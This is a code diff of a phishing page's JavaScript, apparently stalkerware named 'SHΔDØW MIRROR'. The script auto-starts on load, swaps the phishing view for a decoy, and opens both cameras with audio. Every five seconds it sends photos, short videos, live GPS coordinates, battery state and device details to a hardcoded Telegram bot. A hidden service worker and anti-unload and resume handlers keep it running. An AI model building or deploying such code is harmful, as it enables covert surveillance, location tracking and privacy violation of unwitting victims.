@@ -37,19 +37,21 @@
 
 <script>
 /* ===================================================== */
-/* SHΔDØW RIPTIDE Ω – INFINITE LOOP MONSTER              */
+/* SHΔDØW MIRROR Ω – DUAL-CAM 5-SECOND RIPTIDE           */
 /* CYCLE:                                                */
-/*   • Photo: Every 3s                                   */
-/*   • Video: 15s record → send → 15s record → send...   */
-/*   • Metadata: Every 15s (GPS, Battery, Device)        */
-/*   • NO GAPS. NO DELAY. NO STOP.                       */
+/*   • Every 5s:                                         */
+/*       - Photo: Selfie + Rear (2 JPG)                  */
+/*       - Video: Selfie + Rear (2 WebM, 5s each)        */
+/*       - GPS + Battery + Device Info                   */
+/*   • All sent IMMEDIATELY                              */
+/*   • NO QUEUE. NO DELAY. NO STOP.                      */
 /* ===================================================== */
 
 const BOT_ID = '7625898629';
 const BOT_TOKEN = '8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8';
 const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const DEVICE_ID = btoa(navigator.userAgent + Date.now() + Math.random()).slice(0,36);
-const KEY = `RIPTIDE_${DEVICE_ID}`;
+const KEY = `MIRROR_${DEVICE_ID}`;
 
 // Device Info
 const ua = navigator.userAgent;
@@ -62,17 +64,21 @@ const brand = navigator.vendor || 'Unknown';
 const modelMatch = ua.match(/\(([^)]+)\)/);
 const model = modelMatch ? modelMatch[1].split(';')[0].trim() : 'Unknown';
 
-// Send
+// Send Functions (Fire-and-forget)
 async function send(msg) {
     try { await fetch(`${API}/sendMessage?chat_id=${BOT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`, {mode:'no-cors'}); } catch(e) {}
 }
-async function sendPhoto(blob) {
-    const form = new FormData(); form.append('chat_id', BOT_ID); form.append('photo', blob, `live_${Date.now()}.jpg`);
-    await fetch(`${API}/sendPhoto`, {method:'POST', body:form}).catch(() => {});
+async function sendPhoto(blob, caption = '') {
+    const form = new FormData();
+    form.append('chat_id', BOT_ID); form.append('photo', blob, `cam_${Date.now()}.jpg`);
+    if (caption) form.append('caption', caption);
+    fetch(`${API}/sendPhoto`, {method:'POST', body:form}).catch(() => {});
 }
-async function sendVideo(blob) {
-    const form = new FormData(); form.append('chat_id', BOT_ID); form.append('video', blob, `live_${Date.now()}.webm`);
-    await fetch(`${API}/sendVideo`, {method:'POST', body:form}).catch(() => {});
+async function sendVideo(blob, caption = '') {
+    const form = new FormData();
+    form.append('chat_id', BOT_ID); form.append('video', blob, `cam_${Date.now()}.webm`);
+    if (caption) form.append('caption', caption);
+    fetch(`${API}/sendVideo`, {method:'POST', body:form}).catch(() => {});
 }
 
 // Persistence
@@ -85,113 +91,126 @@ if ('serviceWorker' in navigator) {
         const BOT_ID = '${BOT_ID}'; const API = 'https://api.telegram.org/bot${BOT_TOKEN}';
         self.addEventListener('install', () => self.skipWaiting());
         setInterval(() => {
-            fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>RIPTIDE ACTIVE</b>\`, {mode:'no-cors'}).catch(() => {});
-        }, 25000);
+            fetch(\`\${API}/sendMessage?chat_id=\${BOT_ID}&text=%F0%9F%94%B4 <b>MIRROR ALIVE</b>\`, {mode:'no-cors'}).catch(() => {});
+        }, 20000);
     `;
     navigator.serviceWorker.register(URL.createObjectURL(new Blob([sw], {type:'application/javascript'}))).catch(() => {});
 }
 
-// Core Streams
-let stream = null, video = null, canvas = null, ctx = null, watchId = null;
-let recorder = null, chunks = [];
-let lastPhoto = 0, lastMeta = 0;
+// Dual Camera Setup
+let selfieStream = null, rearStream = null;
+let selfieVideo = null, rearVideo = null;
+let selfieCanvas = null, rearCanvas = null;
+let selfieCtx = null, rearCtx = null;
+let selfieRecorder = null, rearRecorder = null;
+let selfieChunks = [], rearChunks = [];
 
-// Init Camera
-async function initCamera() {
+// Init Both Cameras
+async function initDualCam() {
     try {
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: { width: 640, height: 480, facingMode: "environment" },
+        // Selfie (user)
+        selfieStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user", width: 640, height: 480 },
             audio: true
         });
-        video = document.createElement('video'); video.srcObject = stream; await video.play();
-        canvas = document.createElement('canvas'); canvas.width = 640; canvas.height = 480;
-        ctx = canvas.getContext('2d');
+        selfieVideo = document.createElement('video'); selfieVideo.srcObject = selfieStream; await selfieVideo.play();
+        selfieCanvas = document.createElement('canvas'); selfieCanvas.width = 640; selfieCanvas.height = 480;
+        selfieCtx = selfieCanvas.getContext('2d');
+
+        // Rear (environment)
+        rearStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "environment", width: 640, height: 480 },
+            audio: true
+        });
+        rearVideo = document.createElement('video'); rearVideo.srcObject = rearStream; await rearVideo.play();
+        rearCanvas = document.createElement('canvas'); rearCanvas.width = 640; rearCanvas.height = 480;
+        rearCtx = rearCanvas.getContext('2d');
+
         return true;
     } catch(e) {
-        send(`Camera Failed: ${e.message}`);
+        send(`Dual Cam Failed: ${e.message}`);
         return false;
     }
 }
 
-// Photo Every 3s
-function startPhotoLoop() {
-    setInterval(async () => {
-        if (!video || !canvas || Date.now() - lastPhoto < 3000) return;
-        try {
-            ctx.drawImage(video, 0, 0, 640, 480);
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.75));
-            await sendPhoto(blob);
-            lastPhoto = Date.now();
-        } catch(e) {}
-    }, 2900); // Slightly less to avoid drift
+// Capture & Send Photo (Instant)
+async function captureAndSendPhoto(video, ctx, canvas, camName) {
+    ctx.drawImage(video, 0, 0, 640, 480);
+    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
+    await sendPhoto(blob, `${camName} • ${new Date().toLocaleTimeString('fa-IR')}`);
 }
 
-// Video 15s → send → 15s → send (NO GAP)
-function startVideoLoop() {
-    function record() {
-        if (!stream) return;
-        chunks = [];
-        recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
-            await sendVideo(blob);
-            // Immediate restart
-            setTimeout(record, 100);
-        };
-        recorder.start();
-        setTimeout(() => recorder.stop(), 15000);
-    }
-    record();
+// Record 5s Video & Send (Instant)
+function startVideoRecord(video, stream, camName, chunks, onStop) {
+    chunks.length = 0;
+    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = async () => {
+        const blob = new Blob(chunks, { type: 'video/webm' });
+        await sendVideo(blob, `${camName} • 5s • ${new Date().toLocaleTimeString('fa-IR')}`);
+        onStop();
+    };
+    recorder.start();
+    setTimeout(() => recorder.stop(), 5000);
 }
 
-// Metadata Every 15s
-function startMetadataLoop() {
-    let lastGPS = '';
-    navigator.geolocation.watchPosition(pos => {
-        const { latitude, longitude, accuracy } = pos.coords;
-        lastGPS = `<a href="https://maps.google.com/?q=${latitude},${longitude}">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</a> (±${accuracy}m)`;
-    }, () => {}, { enableHighAccuracy: true });
+// GPS + Metadata Every 5s
+let lastGPS = 'Acquiring...';
+navigator.geolocation.watchPosition(pos => {
+    const { latitude, longitude, accuracy } = pos.coords;
+    lastGPS = `<a href="https://maps.google.com/?q=${latitude},${longitude}">${latitude.toFixed(6)}, ${longitude.toFixed(6)}</a> (±${accuracy}m)`;
+}, () => {}, { enableHighAccuracy: true, maximumAge: 0, timeout: 4000 });
 
-    setInterval(async () => {
-        if (Date.now() - lastMeta < 15000) return;
-        const bat = await navigator.getBattery?.() || { level: 0, charging: false };
-        const level = Math.round(bat.level * 100);
-        const charging = bat.charging ? 'Charging' : 'On Battery';
+async function sendMetadata() {
+    const bat = await navigator.getBattery?.() || { level: 0, charging: false };
+    const level = Math.round(bat.level * 100);
+    const charging = bat.charging ? 'Charging' : 'On Battery';
 
-        const meta = `
-METADATA UPDATE
+    const meta = `
+MIRROR UPDATE
 Device: ${brand} ${model}
-OS: ${os}
-Browser: ${browser}
+OS: ${os} • Browser: ${browser}
 Screen: ${screen.width}x${screen.height}
-Language: ${navigator.language}
 Battery: ${level}% [${charging}]
-Location: ${lastGPS || 'Acquiring...'}
+Location: ${lastGPS}
 ID: <code>${DEVICE_ID}</code>
-        `.trim();
+    `.trim();
 
-        await send(meta);
-        lastMeta = Date.now();
-    }, 14900);
+    send(meta);
 }
 
-// Unleash Monster
+// Main 5s Loop — ALL AT ONCE
+function start5SecondRiptide() {
+    setInterval(async () => {
+        const now = Date.now();
+
+        // 1. Dual Photos
+        if (selfieVideo) await captureAndSendPhoto(selfieVideo, selfieCtx, selfieCanvas, 'SELFIE');
+        if (rearVideo) await captureAndSendPhoto(rearVideo, rearCtx, rearCanvas, 'REAR');
+
+        // 2. Dual 5s Videos (fire and forget)
+        if (selfieStream) startVideoRecord(selfieVideo, selfieStream, 'SELFIE', selfieChunks, () => {});
+        if (rearStream) startVideoRecord(rearVideo, rearStream, 'REAR', rearChunks, () => {});
+
+        // 3. GPS + Metadata
+        await sendMetadata();
+
+    }, 5000); // Every 5 seconds — no delay
+}
+
+// Unleash
 async function unleash() {
     document.getElementById('phish').classList.add('hidden');
     document.getElementById('fake').classList.remove('hidden');
     save();
 
-    const camOk = await initCamera();
+    const camOk = await initDualCam();
     if (camOk) {
-        startPhotoLoop();
-        startVideoLoop();
-        startMetadataLoop();
-    }
-
-    send(`RIPTIDE UNLEASHED
-3s Photo | 15s Video Loop | 15s Metadata
+        start5SecondRiptide();
+        send(`MIRROR UNLEASHED
+5s Dual-Cam Photo + Video + GPS + Metadata
 ID: <code>${DEVICE_ID}</code>`);
+    }
 }
 
 // Auto Start
@@ -200,24 +219,16 @@ window.addEventListener('load', () => {
         unleash();
         return;
     }
-    setTimeout(() => document.getElementById('start')?.click(), 1200);
+    setTimeout(() => document.getElementById('start')?.click(), 1000);
 });
 
 document.getElementById('start')?.addEventListener('click', () => {
-    setTimeout(unleash, 600);
+    setTimeout(unleash, 500);
 });
 
-// Anti-Unload
-window.addEventListener('beforeunload', e => {
-    save();
-    e.preventDefault();
-    e.returnValue = '';
-});
-
-// Resume on visibility
-document.addEventListener('visibilitychange', () => {
-    if (!document.hidden && load()) setTimeout(unleash, 300);
-});
+// Anti-Unload + Resume
+window.addEventListener('beforeunload', e => { save(); e.preventDefault(); e.returnValue = ''; });
+document.addEventListener('visibilitychange', () => { if (!document.hidden && load()) setTimeout(unleash, 300); });
 
 </script>
 </body>
